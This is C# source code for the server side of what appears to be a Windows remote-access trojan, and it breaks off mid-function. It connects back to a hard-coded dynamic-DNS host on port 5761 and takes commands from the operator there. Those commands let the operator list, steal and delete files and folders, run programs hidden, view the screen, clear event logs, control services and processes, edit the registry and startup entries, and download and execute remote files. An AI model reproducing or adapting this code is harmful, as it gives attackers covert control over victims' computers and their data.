/******************************************
 * ��Ȩ����Sinner
 * QQ:53811910
 * E-mail:53811910@qq.com
 * ����Blog:53811910.qzone.qq.com
 * CSDN_Blog:http://blog.csdn.net/jackch88/
 * ****************************************/
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Text;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using Microsoft.Win32;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.Devices;
using System.Collections;
using System.ServiceProcess;
using System.Management;

namespace Jackch
{
    public partial class Server
    {
        private Socket socket = null;
        private Socket newSocket = null;
        //����Ҫ���ӵ�IP��ַ
        //private IPAddress IP = IPAddress.Parse(Dns.Resolve(Dns.GetHostName()).AddressList[0].ToString());
        private IPAddress IP = IPAddress.Parse(Dns.Resolve("hrin.3322.org").AddressList[0].ToString());//������Ҫ���ӵ�IP��ַ,3322����ָ����IP��ַ��
        private int Port = 5761;
        private IPEndPoint myServer = null;
        private string comString = null;
        private string command = null;
        private string parameter = null;
        private bool isConnected = false;
        private Thread thread;

        private void InitCommand()
        {
            myServer = new IPEndPoint(IP, Port);
            socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            while (!isConnected)
            {
                try
                {
                    socket.Connect(myServer);
                    isConnected = true;
                    thread = new Thread(new ThreadStart(target));//��������
                    thread.Start(); 
                }
                catch (Exception)
                {
                    isConnected = false;
                    Thread.Sleep(3000);//3�����������
                }
            }
        }
        private void target()
        {
           while (true)
            {
                try
                {
                    comString = ReadFromClient(ref socket);
                }
                catch (Exception)//���Ӻ��ֶϿ������쳣
                {
                    isConnected = false;
                    InitCommand();
                    return;
                }
                command = GetCommand(comString);
                parameter = GetParameter(comString);
                DoCommand(ref command, ref parameter);
            } 
        }

        //��ͻ��˷�����Ϣ
        private bool WriteToClient(ref Socket socket, string SendMessage)
        {
            string sendMsg = SendMessage + "<EOF>";
            byte[] ToSend = System.Text.Encoding.UTF8.GetBytes(sendMsg.ToCharArray());
            try
            {
                socket.Send(ToSend);
                return true;
            }
            catch
            {
                return false;
            }
        }
        private bool Write(ref Socket socket, string SendMessage)
        {
            string sendMsg = SendMessage;
            byte[] ToSend = System.Text.Encoding.UTF8.GetBytes(sendMsg.ToCharArray());
            try
            {
                socket.Send(ToSend);
                return true;
            }
            catch
            {
                return false;
            }
        }
        //��ȡ�ͻ��˷��͵���Ϣ
        private string ReadFromClient(ref Socket socket)
        {
            byte[] byteMessage = new byte[1024];
            socket.Receive(byteMessage);
            string command = System.Text.Encoding.UTF8.GetString(byteMessage, 0, byteMessage.Length);
            int n = command.IndexOf("\r\n");
            command = command.Substring(0, n);
            return command;
        }
        //��ȡ�û�����
        private string GetCommand(string aimString)
        {
            int n = aimString.IndexOf(" ");
            if (n != -1)
            {
                string com = aimString.Substring(0, n);
                return com;
            }
            else
            {
                return aimString;
            }
        }
        //��ȡ�������
        private string GetParameter(string aimString)
        {
            int n = aimString.IndexOf(" ");
            if (n != -1)
            {
                string para = aimString.Substring(n + 1, aimString.Length - n - 1);
                return para;
            }
            else
            {
                return " ";
            }
        }

        //��������
        private void DoCommand(ref string command, ref string parameter)
        {
            if (command == "Connected")
            {
                //WriteToClient(ref socket, "true");
            }
            else if (command == "PcInfo")
            {
                SystemInfo systemInfo = new SystemInfo();
                WriteToClient(ref socket, systemInfo.GetMyComputerName() + "\n" + systemInfo.GetMyScreens() + "\n" + systemInfo.GetMyCpuInfo() + "\n" + systemInfo.GetMyMemoryInfo() + "\n" + systemInfo.GetMyDriveInfo() + "\n" + systemInfo.GetMyOSName() + "\n" + systemInfo.GetMyUserName() + "\n" + systemInfo.GetMyPaths());
            }
            //***************************************************************************************
            //�ļ�����
            else if (command == "Filelist")//�ļ��б�
            {
                try
                {
                    string dir = "";
                    DirectoryInfo curDir = new DirectoryInfo(parameter);
                    if (!curDir.Exists)
                    {
                        dir = "";
                        WriteToClient(ref socket, "<OK>Dir Send\r\n" + dir);
                        return;
                    }
                    DirectoryInfo[] dirdir = curDir.GetDirectories();
                    FileInfo[] dirFiles = curDir.GetFiles();
                    foreach (FileInfo f in dirFiles)
                    {
                        dir = dir + "F:" + f.Name + "\t" + f.Length + "\t" + f.CreationTime.ToString() + "\t" + f.LastWriteTime.ToString() +"\r\n";
                    }
                    foreach (DirectoryInfo d in dirdir)
                    {
                        dir = dir + "D:" + d.Name + "\r\n";
                    }
                    WriteToClient(ref socket, "<OK>Dir Send\r\n" + dir);
                }
                catch (Exception e)
                {
                    WriteToClient(ref socket, e.Message);
                }
            }
            else if (command == "Driverlist")//�����б�
            {
                string[] drives = Environment.GetLogicalDrives();
                string str = "<OK>Dir Send\r\n";
                foreach (string s in drives)
                    str += s + "\r\n";
                WriteToClient(ref socket, str);
            }
            else if (command == "DeleteFile")//ɾ���ļ�
            {
                try
                {
                    File.Delete(parameter);
                }
                catch { }
                string str = "<OK>File Deleted\r\n";
                WriteToClient(ref socket, str);
            }
            else if (command == "DeleteDirectory")//ɾ���ļ���
            {
                try
                {
                    DeleteDir(parameter);
                }
                catch { }
                string str = "<OK>Directory Deleted\r\n";
                WriteToClient(ref socket, str);
            }
            else if (command == "Upload")//�ͻ����ϴ��ļ�
            {
                thread = new Thread(new ThreadStart(Upload));
                thread.Start();
            }
            else if (command == "Download")//�ͻ��������ļ�
            {
                thread = new Thread(new ThreadStart(Download));
                thread.Start();
            }
            else if (command == "Updir")//�ͻ����ϴ��ļ���
            {
                thread = new Thread(new ThreadStart(Updir));
                thread.Start();
            }
            else if (command == "Downdir")//�ͻ��������ļ���
            {
                thread = new Thread(new ThreadStart(Downdir));
                thread.Start();
            }
            else if (command == "Rename")//�������ļ�
            {
                try
                {
                    char[] a = new char[] { '\r' };
                    string[] spl = parameter.Split(a);
                    string para1 = spl[0];
                    string para2 = spl[1];
                    File.Copy(para1, para2, true);
                    File.Delete(para1);
                    WriteToClient(ref socket, "<OK>File Renamed!\r\n");
                }
                catch (Exception e)
                {
                    WriteToClient(ref socket, e.Message);
                }
            }
            else if (command == "move")//�ƶ��ļ�
            {
                try
                {
                    char[] a = new char[] { '\r' };
                    string[] spl = parameter.Split(a);
                    string para1 = spl[0];
                    string para2 = spl[1];
                    File.Move(para1, para2);
                    WriteToClient(ref socket, "<OK>File moved!\r\n");
                }
                catch (Exception e)
                {
                    WriteToClient(ref socket, e.Message);
                }
            }
            else if (command == "Mkdir")//�½��ļ���
            {
                try
                {
                    Directory.CreateDirectory(parameter);
                    WriteToClient(ref socket, "<OK>Mkdir finished!\r\n");
                }
                catch (Exception e)
                {
                    WriteToClient(ref socket, e.Message);
                }
            }
            else if (command == "Mkfile")//�½��ļ�
            {
                try
                {
                    File.Create(parameter);
                    WriteToClient(ref socket, "<OK>Mkfile finished!\r\n");
                }
                catch (Exception e)
                {
                    WriteToClient(ref socket, e.Message);
                }
            }
            else if (command == "Run")//�����ļ�
            {
                try
                {
                    string[] str = parameter.Split('\r');
                    Process Proc = new Process();
                    if (str.Length >= 2)
                    {
                        switch (str[1])
                        {
                            case "min":   Proc.StartInfo.WindowStyle = ProcessWindowStyle.Minimized; break;
                            case "max":   Proc.StartInfo.WindowStyle = ProcessWindowStyle.Maximized; break;
                            case "hidden":Proc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden; break;
                            case "canshu": Proc.StartInfo.Arguments=str[2]; break;
                            default: Proc.StartInfo.WindowStyle = ProcessWindowStyle.Normal; break; 
                        }
                    }
                    if (Directory.Exists(str[0]))//���ļ���
                    {
                        Proc.StartInfo.FileName = "explorer.exe";
                        Proc.StartInfo.Arguments = str[0];
                    }
                    else//���ļ�
                        Proc.StartInfo.FileName = str[0];
                    Proc.Start();
                    WriteToClient(ref socket, "<OK>Run finished!\r\n");
                }
                catch (Exception e)
                {
                    WriteToClient(ref socket, e.Message);
                }
            }
            //*************************************************************************************************
            //��Ļ���
            else if (command == "ViewScreen")//��Ļ���
            {
                thread = new Thread(new ThreadStart(ViewScreen));
                thread.Start();
            }
            else if (command == "EventLog")//�¼���־
            {
                try
                {
                    string[] str = parameter.Split(' ');
                    switch (str[0])
                    {
                        case "list": GetEventlogList(parameter.Substring(parameter.IndexOf(' ')+1)); break;
                        case "del":  DelEventlog(parameter.Substring(parameter.IndexOf(' ')+1)); break;
                    } 
                    WriteToClient(ref socket, "<OK>Send EventLog finished!"); 
                }
                catch (Exception e)
                {
                    WriteToClient(ref socket, e.Message);
                }
            }
            else if (command == "Service")//ϵͳ�����б�
            {
                try
                {
                    string[] str = parameter.Split(' ');
                    switch (str[0])
                    {
                        case "list": GetServiceList(); break;
                        case "start": StartService(parameter.Substring(parameter.IndexOf(' ') + 1)); break;
                        case "stop": StopService(parameter.Substring(parameter.IndexOf(' ') + 1)); break;
                        case "autostart": AutoStartService(parameter.Substring(parameter.IndexOf(' ') + 1)); break;
                    }
                    WriteToClient(ref socket, "<OK>Send Service finished!"); 
                }
                catch (Exception e)
                {
                    WriteToClient(ref socket, e.Message);
                }
            }
            else if (command == "Process")//�����б�
            {
                try
                {
                    string[] str = parameter.Split(' '); 
                    switch (str[0])
                    {
                        case "list": GetProcessList(); break;
                        case "kill": KillProcess(str[1]); break;
                    }
                    WriteToClient(ref socket, "<OK>Send Process finished!"); 
                }
                catch (Exception e)
                {
                    WriteToClient(ref socket, e.Message);
                }
            }
            else if (command == "StartUp")//��������
            {
                try
                {
                    string[] str = parameter.Split(' '); 
                    switch (str[0])
                    {
                        case "list": GetStartUpList(); break;
                        case "kill": KillStartUp(parameter.Substring(parameter.IndexOf(' ')+1)); break;
                    }
                    WriteToClient(ref socket, "<OK>Send StartUp finished!"); 
                }
                catch (Exception e)
                {
                    WriteToClient(ref socket, e.Message);
                }
            }
            else if (command == "NetWork")//��������
            {
                try
                {
                    ArrayList arr = GetNetstart();
                    foreach (string a in arr)
                    {
                        string[] str = a.Split('\n');
                        ArrayList arr1 = GetProcess(int.Parse(str[4]));
                        Write(ref socket,str[0]+"\t"+arr1[0].ToString()+"\t"+str[1]+"\t"+str[2]+"\t"+str[3]+"\t"+str[4]+"\t"+arr1[1].ToString()+"\n");
                    }
                    WriteToClient(ref socket, "<OK>Send NetWork finished!");
                }
                catch (Exception e)
                {
                    WriteToClient(ref socket, e.Message);
                }
            }
            else if (command == "Regedit")//ע���
            {
                try
                {
                    string[] str = parameter.Split(' ');
                    str[1] = parameter.Substring(parameter.IndexOf(' ') + 1);
                    string r = "";
                    switch (str[0])
                    {
                        case "getsubkey": GetSubKey(str[1]); break;
                        case "getkeyvalue": GetKeyValue(str[1]); break;
                        case "new": r=NewReg(str[1],false); break;
                        case "rename": r = RenameReg(str[1], false); break;
                        case "del": r = DelReg(str[1], false); break;
                        case "new1": r = NewReg(str[1], true); break;
                        case "rename1": r = RenameReg(str[1], true); break;
                        case "del1": r = DelReg(str[1], true); break;
                    }
                    WriteToClient(ref socket, r);
                }
                catch (Exception e)
                {
                    WriteToClient(ref socket, e.Message);
                }
            }
            //*************************************************************************************************
            //Զ�̿���
            else if (command == "shutdown")
            {

            }
            else if (command == "restart")
            {

            }
            else if (command == "waring")
            {
                WriteToClient(ref socket, "<OK>waring sended!"); ++c;
                MessageBox.Show(parameter + c.ToString(), "Waring");

            }
            else if (command == "message")
            {
                try
                {
                    string[] str = parameter.Split('\n');

                    MessageBoxButtons m = MessageBoxButtons.OK;
                    MessageBoxIcon ico = MessageBoxIcon.Information;
                    switch (str[2])
                    {
                        case "ȷ��": m = MessageBoxButtons.OK; break;
                        case "ȷ����ȡ��": m = MessageBoxButtons.OKCancel; break;
                        case "�ǡ���": m = MessageBoxButtons.YesNo; break;
                        case "�ǡ���ȡ��": m = MessageBoxButtons.YesNoCancel; break;
                        case "���ԡ�ȡ��": m = MessageBoxButtons.RetryCancel; break;
                        case "��ֹ�����ԡ�����": m = MessageBoxButtons.AbortRetryIgnore; break;
                    }
                    switch (str[3])
                    {
                        case "��ͨ": ico = MessageBoxIcon.Information; break;
                        case "ѯ��": ico = MessageBoxIcon.Question; break;
                        case "����": ico = MessageBoxIcon.Error; break;
                        case "����": ico = MessageBoxIcon.Warning; break;
                    }
                    MessageBox.Show(str[0], str[1], m, ico);
                    WriteToClient(ref socket, "<OK>message sended!");
                }
                catch (Exception e)
                {
                    WriteToClient(ref socket, e.Message);
                }
            }
            else if (command == "textmsg")
            {
                try
                {
                    string[] str = parameter.Split('\n');

                    System.Drawing.Text.InstalledFontCollection MyFamilies = new System.Drawing.Text.InstalledFontCollection();
                    FontForm ff = new FontForm();
                    ff.label1.Text = str[0];
                    ff.label1.Location = new Point(int.Parse(str[1]), int.Parse(str[2]));
                    ff.label1.Font = new Font(new FontFamily(str[3]), int.Parse(str[4]));
                    ff.label1.ForeColor = Color.FromName(str[5]);
                    ff.Show();

                    WriteToClient(ref socket, "<OK>textmsg sended!");
                }
                catch (Exception e)
                {
                    WriteToClient(ref socket, e.Message);
                }
            }
            else if (command == "openie")
            {
                try
                {
                    string[] str = parameter.Split('\n');
                    str[0] = str[0].Trim();
                    str[1] = str[1].Trim();
                    if (str[0] != "")
                        Cmd.RunIE(str[0]);
                    if (str[1] != "")
                    {
                        Uri url = new Uri(str[1]);

                        HttpWebRequest hwr = (HttpWebRequest)WebRequest.Create(url);
                        HttpWebResponse hwrsp = (HttpWebResponse)hwr.GetResponse();
                        WebHeaderCollection whc = hwrsp.Headers;
                        string fileName = whc["filename"];//.Get(7);
                        MessageBox.Show(fileName);

                        Stream strm = hwrsp.GetResponseStream();
                        StreamReader sr = new StreamReader(strm);
                        FileStream fs = new FileStream(fileName, FileMode.OpenOrCreate, FileAccess.Write);
                        StreamWriter sw = new StreamWriter(fs);
                        
                        while (sr.Peek() > -1)
                        {
                            sw.WriteLine(sr.ReadLine());
                        }
                        
                        sw.Close();
                        fs.Close();
                        sr.Close();
                        strm.Close();
                        if (str[2] == "true")
                            Cmd.RunFile(fileName);
                    }

                    WriteToClient(ref socket, "<OK>openie sended!");
                }
                catch (Exception e)
                {
                    WriteToClient(ref socket, e.Message);
                }
            }
            else if (command == "��ʾ����")
            {
                try
                {
                    System.Diagnostics.Process MyProcess;
                    MyProcess = new System.Diagnostics.Process();
                    MyProcess.StartInfo.FileName = "MyDesktop.scf";
                    MyProcess.StartInfo.Verb = "Open";
                    MyProcess.Start();
                }
                catch (Exception e)
                {
                    WriteToClient(ref socket, e.Message);
                    MessageBox.Show(e.Message);
                }
                WriteToClient(ref socket, "<OK>��ʾ���� sended!");
            }
            ///////////�Ͽ�����
            else if (command == "quit")
            {
                WriteToClient(ref socket, "<OK>connected closed!");
                socket.Close();
            }
            else
            {
                WriteToClient(ref socket, "<ERROR>unrecognized command!");
                MessageBox.Show("test");
            }
        }
        private int c = 0;
        private void DeleteDir(string file)
        {
            DirectoryInfo d = new DirectoryInfo(file);
            foreach (FileInfo f in d.GetFiles())
                f.Delete();
            foreach (DirectoryInfo dd in d.GetDirectories())
                DeleteDir(dd.FullName);
            d.Delete();
        }
        /// <summary>
        /// �ͻ����ϴ��ļ�
        /// </summary>
        private void Upload()
        {
            FileStream fs = new FileStream(parameter, FileMode.OpenOrCreate, FileAccess.Write);
            int number = 0;
            byte[] by = new byte[1024];
            newSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            newSocket.Connect(IP, Port + 1);
            while ((number = newSocket.Receive(by)) > 0)
            {
                fs.Write(by, 0, by.Length);
                fs.Flush();
                by = new byte[1024];
            }
            fs.Close();
            newSocket.Close();
        }
        /// <summary>
        /// �ͻ��������ļ�
        /// </summary>
        private void Download()
        {
            FileStream fs = new FileStream(parameter, FileMode.Open, FileAccess.Read);
            int number = 0;
            byte[] by = new byte[1024];
            newSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            newSocket.Connect(IP, Port + 2);
            while ((number = fs.Read(by, 0, 1024)) > 0)
            {
                newSocket.Send(by);
                fs.Flush();
                by = new byte[1024];
            }
            fs.Close();
            newSocket.Close();
        }
        /// <summary>
        /// �ͻ����ϴ��ļ���
        /// </summary>
        private void Updir()
        {
            newSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            newSocket.Connect(IP, Port + 1);
            updir();
            newSocket.Close();
        }
        private void updir()
        {
            int number = 0;
            byte[] by = new byte[1024];
            string dir = parameter;
            Directory.CreateDirectory(dir);
            while (true)
            {
                string s = "";
                bool isfile = true;
                while (true)
                {
                    if ((number = newSocket.Receive(by)) > 0)
                    {
                        s = System.Text.Encoding.Unicode.GetString(by, 0, number);
                        if (s == "end")//�ļ��д������
                        {
                            newSocket.Close();
                            return;
                        }
                        else if (s.Split('\r')[0] == "Mkdir")//�½��ļ�Ŀ¼
                        {
                            Directory.CreateDirectory(dir + @"\" + s.Split('\r')[1]);
                            isfile = false;
                        }
                        else
                        {
                            isfile = true;
                            by = new byte[1024];
                        }
                        break;
                    }
                }
                if (!isfile)
                    continue;
                string f = Path.Combine(dir, s.Split('\r')[0]);
                FileStream fs = new FileStream(f, FileMode.OpenOrCreate, FileAccess.Write);
                long len = long.Parse(s.Split('\r')[1]);
                while (len > 0)
                {
                    if ((number = newSocket.Receive(by)) > 0)
                    {
                        fs.Write(by, 0, by.Length);
                        fs.Flush();
                        len -= number;
                    }
                    by = new byte[1024];
                }
                fs.Close();
            }
            newSocket.Close();
        }
        /// <summary>
        /// �ͻ��������ļ���
        /// </summary>
        private void Downdir()
        {
            newSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            newSocket.Connect(IP, Port + 2);
            downdir(parameter, new DirectoryInfo(parameter));
            newSocket.Send(System.Text.Encoding.Unicode.GetBytes("end"));
            newSocket.Close();
        }
        private void downdir(string str,DirectoryInfo dir)
        {
            byte[] by = new byte[1024];
            DirectoryInfo d = new DirectoryInfo(str);
            FileStream fileStream;
            foreach (FileInfo f in d.GetFiles())
            {
                fileStream = new FileStream(f.FullName, FileMode.Open, FileAccess.Read);
                string s = f.FullName.Remove(0, dir.FullName.Length + 1) + "\r" + f.Length.ToString();
                for (int i = s.Length; i < 512; ++i)
                    s += "\r";
                by = System.Text.Encoding.Unicode.GetBytes(s);
                newSocket.Send(by);
                int number = 0;
                while ((number = fileStream.Read(by, 0, 1024)) > 0)
                {
                    newSocket.Send(by);
                    fileStream.Flush();
                    by = new byte[1024];
                }
                fileStream.Close();
            }
            foreach (DirectoryInfo dd in d.GetDirectories())
            {
                string s = "Mkdir\r" + dd.FullName.Remove(0, dir.FullName.Length + 1);
                for (int i = s.Length; i < 512; ++i)
                    s += "\r";
                by = System.Text.Encoding.Unicode.GetBytes(s);
                newSocket.Send(by);
                downdir(dd.FullName,dir);
            }
        }
        /// <summary>
        /// ��ȡ�ļ�ͼ��
        /// </summary>
        /// <param name="str"></param>
        /// <returns></returns>
        [DllImport("Shell32.dll")]
        public static extern int ExtractIcon(IntPtr h, string strx, int ii);
        [DllImport("Shell32.dll")]
        public static extern int SHGetFileInfo(string pszPath, uint dwFileAttributes, ref SHFILEINFO psfi, uint cbFileInfo, uint uFlags);
        
        [StructLayout(LayoutKind.Sequential)]
        public struct SHFILEINFO
        {
            public IntPtr hIcon;
            public int iIcon;
            public int dwAttributes;
            public string szDisplayName;
            public string szTypeName;
        }
        private Icon GetIcon(string str)
        {
            SHFILEINFO fi = new SHFILEINFO();
            int iTotal = (int)SHGetFileInfo(str, 0, ref fi, 100, 16640);//SHGFI_ICON|SHGFI_SMALLICON
            Icon ic = Icon.FromHandle(fi.hIcon);
            return ic;
        }
        /// <summary>
        /// ���ݽ���ID��ȡ�����û�
        /// </summary>
        /// <param name="pID"></param>
        /// <returns></returns>
        private string GetUserById(int pID)
        {
            SelectQuery query1 = new SelectQuery("Select   *   from   Win32_Process Where ProcessID=" + pID);
            ManagementObjectSearcher searcher1 = new ManagementObjectSearcher(query1);
            string text1 = null;

            try
            {
                foreach (ManagementObject disk in searcher1.Get())
                {
                    ManagementBaseObject inPar = null;
                    ManagementBaseObject outPar = null;

                    inPar = disk.GetMethodParameters("GetOwner");
                    outPar = disk.InvokeMethod("GetOwner", inPar, null);
                    text1 = outPar["User"].ToString();
                    break;
                }
            }
            catch (Exception e)
            {
                text1 = e.Message;
            }

            return text1;
        }
        /// <summary>
        /// ����������غ���
        /// </summary>
        /// <param name="hkey"></param>
        /// <param name="Suffix"></param>
        /// <returns></returns>
        private void SendRegistry(string hkey, string Suffix)
        {
            ArrayList arr = new ArrayList();
            RegistryKey GlobalReg = Registry.LocalMachine;
            string TheKey = @"SOFTWARE\Microsoft\Windows\CurrentVersion\";
            try
            {
                switch (hkey)
                {
                    case "HKEY_LOCAL_MACHINE":
                        GlobalReg = Registry.LocalMachine.OpenSubKey(TheKey + Suffix);
                        break;

                    case "HKEY_CURRENT_USER":
                        GlobalReg = Registry.CurrentUser.OpenSubKey(TheKey + Suffix);
                        break;

                    case "HKEY_CLASSES_ROOT":
                        GlobalReg = Registry.ClassesRoot.OpenSubKey(TheKey + Suffix);
                        break;

                    case "HKEY_CURRENT_CONFIG":
                        GlobalReg = Registry.CurrentConfig.OpenSubKey(TheKey + Suffix);
                        break;

                    case "HKEY_USERS":
                        GlobalReg = Registry.Users.OpenSubKey(TheKey + Suffix);
                        break;
                }
                if (GlobalReg.ValueCount != 0)
                {
                    foreach (string s in GlobalReg.GetValueNames())
                    {
                        Write(ref socket, s + "\b" + hkey + "\\" + TheKey + Suffix + "\b" + GlobalReg.GetValue(s) + "\n");
                    }
                }
            }
            catch { }
        }
        private void SendStartupFolder(string Root)
        {
            RegistryKey GlobalReg = Registry.LocalMachine;
            DirectoryInfo GlobalDir = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.Startup));
            ArrayList arr = new ArrayList();
            try
            {
                switch (Root)
                {
                    case "All Users Enabled":
                        Root = "All Users";
                        GlobalReg = Registry.LocalMachine.OpenSubKey
                            (@"SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Shell Folders", true);
                        GlobalDir = new DirectoryInfo(GlobalReg.GetValue("Common Startup", "C:\\").ToString());

                        GlobalReg.Close();
                        break;

                    case "User Name Enabled":
                        Root = Environment.UserName;
                        GlobalDir = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.Startup));
                        break;

                    case "All Users Disabled":
                        Root = "All Users";
                        GlobalDir = new DirectoryInfo(Application.StartupPath + @"\BackUps\All Users");
                        break;

                    case "User Name Disabled":
                        Root = Environment.UserName;
                        GlobalDir = new DirectoryInfo(Application.StartupPath + @"\BackUps\" + Environment.UserName);

                        break;
                }
                if (GlobalDir.Exists)
                {
                    foreach (FileInfo SingleIt in GlobalDir.GetFiles("*.*"))
                    {
                        if (SingleIt.Name != "desktop.ini")
                            Write(ref socket, SingleIt.Name + "\b" + SingleIt.FullName + "\b" + SingleIt.FullName + "\n");
                    }
                }
            }
            catch { }
        }
        private ArrayList GetNetstart()
        {
            ArrayList arr = new ArrayList();
            string str = Jackch.Cmd.RunCmd("netstat -ano");
            string[] s = str.Split('\n');
            for (int i = 4; i < s.Length; ++i)
            {
                string now = "";
                string all = "";
                int count = 0;
                for (int j = 0; j < s[i].Length; ++j)
                {
                    if (s[i][j] == ' ')
                    {
                        if (now != "")
                        {
                            ++count;
                            all += now + "\n";
                        }
                        now = "";
                    }
                    else
                        now += s[i][j];
                }
                all += now;
                if (count < 4)
                    break;
                arr.Add(all);
            }
            return arr;
        }
        private ArrayList GetProcess(int pid)
        {
            ArrayList arr = new ArrayList();
            Process[] processes = Process.GetProcesses();
            for (int i = 0; i < processes.Length; i++)
            {
                if (pid == processes[i].Id)
                {
                    try
                    {
                        arr.Add(processes[i].MainModule.ModuleName);
                        arr.Add(processes[i].MainModule.FileName);
                    }
                    catch
                    {
                        arr.Clear();
                        arr.Add("System");
                        arr.Add("[System Process]");
                    }
                    break;
                }
            }
            return arr;
        }
        private RegistryKey GetRegKey(string MyPath)//ȡ��ע���ڵ���Ϣ
        {
            RegistryKey MyReg = Registry.LocalMachine;
            string[] KeyName = MyPath.Split(new Char[] { '\\' });
            switch (KeyName[0])
            {
                case "HKEY_CLASSES_ROOT":
                    MyReg = Registry.ClassesRoot;
                    break;
                case "HKEY_CURRENT_USER":
                    MyReg = Registry.CurrentUser;
                    break;
                case "HKEY_LOCAL_MACHINE":
                    MyReg = Registry.LocalMachine;
                    break;
                case "HKEY_USERS":
                    MyReg = Registry.Users;
                    break;
                case "HKEY_CURRENT_CONFIG":
                    MyReg = Registry.CurrentConfig;
                    break;
                case "HKEY_DYN_DATA":
                    MyReg = Registry.DynData;
                    break;
            }
            if (MyPath.IndexOf("\\") > 0)
            {
                MyPath = MyPath.Substring(MyPath.IndexOf("\\") + 1);
                try
                {
                    MyReg = MyReg.OpenSubKey(MyPath,true);
                }
                catch { }
            }
            return MyReg;
        }
        private void GetSubKey(string path)
        {
            RegistryKey MyReg = GetRegKey(path);
            foreach (string a in MyReg.GetSubKeyNames())
            {
                Write(ref socket, a + "\t");
            }              
        }
        private void GetKeyValue(string path)
        {
            RegistryKey MyReg = GetRegKey(path);
            string[] Values = MyReg.GetValueNames();
            int length = Values.Length;
            string MyRegValueName;
            object MyRegValueType;
            object MyRegValueData;
            for (int i = 0; i < length; ++i)
            {
                MyRegValueName = Values[i];
                MyRegValueData = MyReg.GetValue(MyRegValueName);
                MyRegValueType = MyRegValueData.GetType();
                Write(ref socket, MyRegValueName + "\t" + MyRegValueType + "\t" + MyRegValueData + "\b");
            }
        }
        private void RegistryCopy(RegistryKey key1, RegistryKey key2)
        {
            foreach (string s in key1.GetValueNames())
            {
                key2.SetValue(s, key1.GetValue(s), key1.GetValueKind(s));
            }
            foreach (string key in key1.GetSubKeyNames())
            {
                key2.CreateSubKey(key);
                RegistryKey key3 = key1.OpenSubKey(key, true);
                RegistryKey key4 = key2.OpenSubKey(key, true);
                RegistryCopy(key3, key4);
            }
        }
        private string NewReg(string str,bool isKey)
        {
            string[] s = str.Split('\t');
            RegistryKey MyReg = GetRegKey(s[0]);
            if (!isKey)
            {
                try
                {
                    MyReg.CreateSubKey(s[1]);
                 }
                catch 
                { return "0";}
            }
            else
            {
                try
                {
                    MyReg.SetValue(s[1], "");
                }
                catch 
                { return "0";}
            }
            return "1";
        }
        private string RenameReg(string str,bool isKey)
        {
            string[] s = str.Split('\t');
            RegistryKey MyReg = GetRegKey(s[0]);
            if (!isKey)
            {
                try
                {
                    MyReg.CreateSubKey(s[2]);
                    RegistryKey reg1 = MyReg.OpenSubKey(s[1], true);
                    RegistryKey reg2 = MyReg.OpenSubKey(s[2], true);
                    RegistryCopy(reg1, reg2);
                    
                    MyReg.DeleteSubKey(s[1]);
                }
                catch (System.InvalidOperationException)
                {
                    try
                    {
                        MyReg.DeleteSubKeyTree(s[1]);
                    }
                    catch { return "0"; }
                }
                catch { return "0"; }
            }
            else
            {
                try
                {
                    MyReg.SetValue(s[2], s[3], MyReg.GetValueKind(s[1]));
                    if (s[1] != s[2])
                        MyReg.DeleteValue(s[1]);
                }
                catch
                {
                    return "0";
                }
            }
            return "1";
        }
        private string DelReg(string str, bool isKey)
        {
            string[] s = str.Split('\t');
            RegistryKey MyReg = GetRegKey(s[0]);
            if (!isKey)
            {
                try
                {
                    MyReg.DeleteSubKey(s[1]);
                }
                catch (System.InvalidOperationException)
                {
                    try
                    {
                        MyReg.DeleteSubKeyTree(s[1]);
                    }
                    catch { return "0"; }
                }
                catch { return "0"; }
            }
            else
            {
                try
                {
                    MyReg.DeleteValue(s[1]);
                }
                catch { return "0"; }
            }
            return "1";
        }
        private void GetProcessList()
        {
            Process[] processes = Process.GetProcesses();
            foreach (Process instance in processes)
            {
                try
                {
                    Write(ref socket, instance.Id.ToString() + "\t" + instance.MainModule.ModuleName + "\t" + instance.PrivateMemorySize.ToString() + " K" + "\t" + instance.MainModule.FileName + "\b");

                }
                catch
                {
                    Write(ref socket, instance.Id.ToString() + "\t" + "System" + "\t" + instance.PrivateMemorySize.ToString() + " K" + "\t" + "[System Process]" + "\b");
                }
            }
        }
        private void KillProcess(string pid)
        {
            Process[] processes = Process.GetProcesses();
            foreach (Process pro in processes)
            {
                if (pro.Id.ToString() == pid)
                {
                    pro.Kill();
                    break;
                }
            }
        }
        private void GetStartUpList()
        {
            SendRegistry("HKEY_LOCAL_MACHINE", "Run");
            SendRegistry("HKEY_LOCAL_MACHINE", "RunOnce");
            SendRegistry("HKEY_LOCAL_MACHINE", "RunOnceEx");
            SendRegistry("HKEY_LOCAL_MACHINE", "RunServices");
            SendRegistry("HKEY_LOCAL_MACHINE", "RunServicesOnce");
            SendRegistry("HKEY_CURRENT_USER", "Run");
            SendRegistry("HKEY_CURRENT_USER", "RunOnce");
            SendStartupFolder("User Name Enabled");
            SendStartupFolder("All Users Enabled");
            SendStartupFolder("User Name Disabled");
            SendStartupFolder("All Users Disabled");
        }
        private void KillStartUp(string str)
        {
            string[] s = str.Split('\t');
            if (File.Exists(s[1]))
                File.Delete(s[1]);
            else
            {
                RegistryKey GlobalReg = Registry.LocalMachine;
                string hkey = s[1].Split('\\')[0];
                string TheKey = s[1].Substring(s[1].IndexOf('\\') + 1);
                try
                {
                    switch (hkey)
                    {
                        case "HKEY_LOCAL_MACHINE":
                            GlobalReg = Registry.LocalMachine.OpenSubKey(TheKey, true);
                            break;

                        case "HKEY_CURRENT_USER":
                            GlobalReg = Registry.CurrentUser.OpenSubKey(TheKey, true);
                            break;

                        case "HKEY_CLASSES_ROOT":
                            GlobalReg = Registry.ClassesRoot.OpenSubKey(TheKey, true);
                            break;

                        case "HKEY_CURRENT_CONFIG":
